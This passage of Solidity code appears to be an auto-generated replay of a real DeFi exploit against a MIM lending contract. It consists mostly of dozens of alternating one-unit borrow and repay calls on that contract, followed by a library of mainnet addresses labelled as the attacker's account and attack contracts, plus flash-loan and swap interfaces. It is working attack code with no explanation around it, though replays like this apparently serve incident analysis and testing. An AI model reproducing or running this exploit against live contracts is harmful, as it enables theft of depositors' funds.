            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).borrow(address(this), a7259e16a90BorrowAmount_68);
        }
    }

    function _replayProtocolCal51() internal {
        {
            uint256 a7259e16a90RepayAmount_68 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repay(address(this), true, a7259e16a90RepayAmount_68);
        }
    }

    function _replayProtocolCal52() internal {
        {
            uint256 a7259e16a90BorrowAmount_69 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).borrow(address(this), a7259e16a90BorrowAmount_69);
        }
    }

    function _replayProtocolCal53() internal {
        {
            uint256 a7259e16a90RepayAmount_69 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repay(address(this), true, a7259e16a90RepayAmount_69);
        }
    }

    function _replayProtocolCal54() internal {
        {
            uint256 a7259e16a90BorrowAmount_70 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).borrow(address(this), a7259e16a90BorrowAmount_70);
        }
    }

    function _replayProtocolCal55() internal {
        {
            uint256 a7259e16a90RepayAmount_70 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repay(address(this), true, a7259e16a90RepayAmount_70);
        }
    }

    function _replayProtocolCal56() internal {
        {
            uint256 a7259e16a90BorrowAmount_71 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).borrow(address(this), a7259e16a90BorrowAmount_71);
        }
    }

    function _replayProtocolCal57() internal {
        {
            uint256 a7259e16a90RepayAmount_71 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repay(address(this), true, a7259e16a90RepayAmount_71);
        }
    }

    function _replayProtocolCal58() internal {
        {
            uint256 a7259e16a90BorrowAmount_72 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).borrow(address(this), a7259e16a90BorrowAmount_72);
        }
    }

    function _replayProtocolCal59() internal {
        {
            uint256 a7259e16a90RepayAmount_72 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repay(address(this), true, a7259e16a90RepayAmount_72);
        }
    }

    function _replayProtocolCal60() internal {
        {
            uint256 a7259e16a90BorrowAmount_73 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).borrow(address(this), a7259e16a90BorrowAmount_73);
        }
    }

    function _replayProtocolCal61() internal {
        {
            uint256 a7259e16a90RepayAmount_73 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repay(address(this), true, a7259e16a90RepayAmount_73);
        }
    }

    function _replayProtocolCal62() internal {
        {
            uint256 a7259e16a90BorrowAmount_74 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).borrow(address(this), a7259e16a90BorrowAmount_74);
        }
    }

    function _replayProtocolCal63() internal {
        {
            uint256 a7259e16a90RepayAmount_74 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repay(address(this), true, a7259e16a90RepayAmount_74);
        }
    }

    function _replayProtocolCal64() internal {
        {
            uint256 a7259e16a90BorrowAmount_75 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).borrow(address(this), a7259e16a90BorrowAmount_75);
        }
    }

    function _replayProtocolCal65() internal {
        {
            uint256 a7259e16a90RepayAmount_75 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repay(address(this), true, a7259e16a90RepayAmount_75);
        }
    }

    function _replayProtocolCal66() internal {
        {
            uint256 a7259e16a90BorrowAmount_76 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).borrow(address(this), a7259e16a90BorrowAmount_76);
        }
    }

    function _replayProtocolCal67() internal {
        {
            uint256 a7259e16a90RepayAmount_76 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repay(address(this), true, a7259e16a90RepayAmount_76);
        }
    }

    function _replayProtocolCal68() internal {
        {
            uint256 a7259e16a90BorrowAmount_77 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).borrow(address(this), a7259e16a90BorrowAmount_77);
        }
    }

    function _replayProtocolCal69() internal {
        {
            uint256 a7259e16a90RepayAmount_77 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repay(address(this), true, a7259e16a90RepayAmount_77);
        }
    }

    function _replayProtocolCal70() internal {
        {
            uint256 a7259e16a90BorrowAmount_78 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).borrow(address(this), a7259e16a90BorrowAmount_78);
        }
    }

    function _replayProtocolCal71() internal {
        {
            uint256 a7259e16a90RepayAmount_78 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repay(address(this), true, a7259e16a90RepayAmount_78);
        }
    }

    function _replayProtocolCal72() internal {
        {
            uint256 a7259e16a90BorrowAmount_79 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).borrow(address(this), a7259e16a90BorrowAmount_79);
        }
    }

    function _replayProtocolCal73() internal {
        {
            uint256 a7259e16a90RepayAmount_79 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repay(address(this), true, a7259e16a90RepayAmount_79);
        }
    }

    function _replayProtocolCal74() internal {
        {
            uint256 a7259e16a90BorrowAmount_80 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).borrow(address(this), a7259e16a90BorrowAmount_80);
        }
    }

    function _replayProtocolCal75() internal {
        {
            uint256 a7259e16a90RepayAmount_80 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repay(address(this), true, a7259e16a90RepayAmount_80);
        }
    }

    function _replayProtocolCal76() internal {
        {
            uint256 a7259e16a90BorrowAmount_81 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).borrow(address(this), a7259e16a90BorrowAmount_81);
        }
    }

    function _replayProtocolCal77() internal {
        {
            uint256 a7259e16a90RepayAmount_81 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repay(address(this), true, a7259e16a90RepayAmount_81);
        }
    }

    function _replayProtocolCal78() internal {
        {
            uint256 a7259e16a90BorrowAmount_82 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).borrow(address(this), a7259e16a90BorrowAmount_82);
        }
    }

    function _replayProtocolCal79() internal {
        {
            uint256 a7259e16a90RepayAmount_82 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repay(address(this), true, a7259e16a90RepayAmount_82);
        }
    }

    function _replayProtocolCal80() internal {
        {
            uint256 a7259e16a90BorrowAmount_83 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).borrow(address(this), a7259e16a90BorrowAmount_83);
        }
    }

    function _replayProtocolCal81() internal {
        {
            uint256 a7259e16a90RepayAmount_83 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repay(address(this), true, a7259e16a90RepayAmount_83);
        }
    }

    function _replayProtocolCal82() internal {
        {
            uint256 a7259e16a90BorrowAmount_84 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).borrow(address(this), a7259e16a90BorrowAmount_84);
        }
    }

    function _replayProtocolCal83() internal {
        {
            uint256 a7259e16a90RepayAmount_84 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repay(address(this), true, a7259e16a90RepayAmount_84);
        }
    }

    function _replayProtocolCal84() internal {
        {
            uint256 a7259e16a90BorrowAmount_85 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).borrow(address(this), a7259e16a90BorrowAmount_85);
        }
    }

    function _replayProtocolCal85() internal {
        {
            uint256 a7259e16a90RepayAmount_85 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repay(address(this), true, a7259e16a90RepayAmount_85);
        }
    }

    function _replayProtocolCal86() internal {
        {
            uint256 a7259e16a90BorrowAmount_86 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).borrow(address(this), a7259e16a90BorrowAmount_86);
        }
    }

    function _replayProtocolCal87() internal {
        {
            uint256 a7259e16a90RepayAmount_86 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repay(address(this), true, a7259e16a90RepayAmount_86);
        }
    }

    function _replayProtocolCal88() internal {
        {
            uint256 a7259e16a90BorrowAmount_87 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).borrow(address(this), a7259e16a90BorrowAmount_87);
        }
    }

    function _replayProtocolCal89() internal {
        {
            uint256 a7259e16a90RepayAmount_87 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repay(address(this), true, a7259e16a90RepayAmount_87);
        }
    }

    function _replayProtocolCal90() internal {
        {
            uint256 a7259e16a90BorrowAmount_88 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).borrow(address(this), a7259e16a90BorrowAmount_88);
        }
    }

    function _replayProtocolCal91() internal {
        {
            uint256 a7259e16a90RepayAmount_88 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repay(address(this), true, a7259e16a90RepayAmount_88);
        }
    }

    function _replayProtocolCal92() internal {
        {
            uint256 a7259e16a90BorrowAmount_89 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).borrow(address(this), a7259e16a90BorrowAmount_89);
        }
    }

    function _replayProtocolCal93() internal {
        {
            uint256 a7259e16a90RepayAmount_89 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repay(address(this), true, a7259e16a90RepayAmount_89);
        }
    }

    function _replayProtocolCal94() internal {
        {
            uint256 a7259e16a90RepayAmount_90 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repay(address(this), true, a7259e16a90RepayAmount_90);
        }
    }

    function _handleFlashLoanCa5() public {}
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant A_000000_0004 = 0x0000000000000000000000000000000000000004;
    address internal constant A_0AB799_89E6 = 0x0aB7999894F36eDe923278d4E898e78085B289e6;
    address internal constant attack_child = 0x193E045BeE45C7573Ff89b12601C745AF739CE67;
    address internal constant A_214BE7_F881 = 0x214BE7eBEc865c25c83DF5B343E45Aa3Bf8Df881;
    address internal constant UniswapV3Pool = 0x298b7c5e0770D151e4C5CF6cCA4Dae3A3FFc8E27;
    address internal constant A_2C561A_CD34 = 0x2c561aB0Ed33E40c70ea380BaA0dBC1ae75Ccd34;
    address internal constant A_2F2A75_3CE2 = 0x2f2A75279a2AC0C6b64087CE1915B1435b1d3ce2;
    address internal constant A_33D778_B4C7 = 0x33D778eD712C8C4AdD5A07baB012d1ce7bb0B4C7;
    address internal constant A_3B473F_9451 = 0x3B473F790818976d207C2AcCdA42cb432b749451;
    address internal constant FiatTokenV2_2 = 0x43506849D7C04F9138D1A2050bbF3A0c054402dd;
    address internal constant A_48ED01_1A30 = 0x48ED01117a130b660272228728e07eF9efe21A30;
    address internal constant A_577BE3_B1CC = 0x577BE3eD9A71E1c355f519BBDF5f09Ba2018b1Cc;
    address internal constant MIM_3LP3CRV_f = 0x5a6A4D54456819380173272A5E8E9B9904BdF41B;
    address internal constant A_3Crv = 0x6c3F90f043a72FA612cbac8115EE7e52BDe6E490;
    address internal constant A_7259E1_6A90 = 0x7259e152103756e1616A77Ae982353c3751A6a90;
    address internal constant A_7E1C8F_5FF1 = 0x7E1C8fEF68a87F7BdDf4ae644Fe4D6e6362F5fF1;
    address internal constant yvCurve_3Crypto_f = 0x8078198Fc424986ae89Ce4a910Fc109587b6aBF3;
    address internal constant attacker_eoa = 0x87F585809Ce79aE39A5fa0C7C96d0d159eb678C9;
    address internal constant A_88E6A0_5640 = 0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640;
    address internal constant A_941EC8_8DE9 = 0x941ec857134B13c255d6EBEeD1623b1904378De9;
    address internal constant A_9445E9_D82A = 0x9445e93057F3f5e3452Ce50fC867b22a48B4d82A;
    address internal constant MIM = 0x99D8a9C45b2ecA8864373A26D1459e3Dff1e17F3;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant Vyper_contract_BEBC44 = 0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant A_C0433E_54F5 = 0xc0433E26E3D2Ae7D1D80E39a6D58062D1eAA54f5;
    address internal constant A_C3BE09_1FE5 = 0xc3Be098f9594E57A3e71f485a53d990FE3961fe5;
    address internal constant crv3crypto = 0xc4AD29ba4B3c580e6D59105FFf484999997675Ff;
    address internal constant A_D24CB0_708C = 0xD24cb02BEd630BAA49887168440D90BE8DA6708c;
    address internal constant A_D51A44_AE46 = 0xD51a44d3FaE010294C616388b506AcdA1bfAAE46;
    address internal constant A_D96F48_2CCE = 0xd96f48665a1410C0cd669A88898ecA36B9Fc2cce;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address internal constant attack_contract = 0xE1091D17473b049CcCD65c54f71677Da85b77A45;
    address internal constant A_E435BE_719D = 0xe435BEbA6DEE3D6F99392ab9568777EB8165719d;
    address internal constant attack_child_4E5A = 0xE59B54a9E37ab69F6E9312a9b3f72539ee184e5A;
    address internal constant A_EE6449_F62D = 0xEe64495BF9894f6c0A2Df4ac983581AADb87f62D;
    address internal constant yVault = 0xfA6ebB3a62Dde486f87661D238B53BF6557d386A;
    address internal constant A_FFFFFF_FFFF = 0xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF;
}

interface IContract_7259E1_6A90 {
    function addCollateral(address, bool, uint256) external;
    function borrow(address, uint256) external;
    function repay(address, bool, uint256) external returns (uint256);
    function repayForAll(uint128, bool) external returns (uint256);
    function totalBorrow() external view;
    function userBorrowPart(address) external view returns (uint256);
}

interface IContract_88E6A0_5640 {
    function slot0() external view;
    function swap(address, bool, int256, uint160, bytes calldata) external;
    function token0() external view returns (uint256);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IContract_D51A44_AE46 {
    function add_liquidity(uint256[3] calldata, uint256) external;
}

interface IContract_D96F48_2CCE {
    function balanceOf(address, address) external view returns (uint256);
    function deposit(address, address, address, uint256, uint256) external;
    function flashLoan(address, address, address, uint256, bytes calldata) external;
    function withdraw(address, address, address, uint256, uint256) external;
    function balanceOf(address account) external view returns (uint256);
}

interface IMIM_3LP3CRV_f {
    function exchange_underlying(int128, int128, uint256, uint256) external;
}

interface IUniswapV3Pool {
    function slot0() external view;
    function swap(address, bool, int256, uint160, bytes calldata) external;
    function token0() external view returns (uint256);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IWETH {
    function withdraw(uint256) external;
}

interface IyvCurve_3Crypto_f {
    function deposit(uint256) external returns (uint256);
}

library Harness {
    function safeBalance(address token, address account) internal view returns (uint256) {
        if (token.code.length == 0) return 0;
        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSignature("balanceOf(address)", account));
        if (!ok || data.length < 32) return 0;
        return abi.decode(data, (uint256));
    }
}
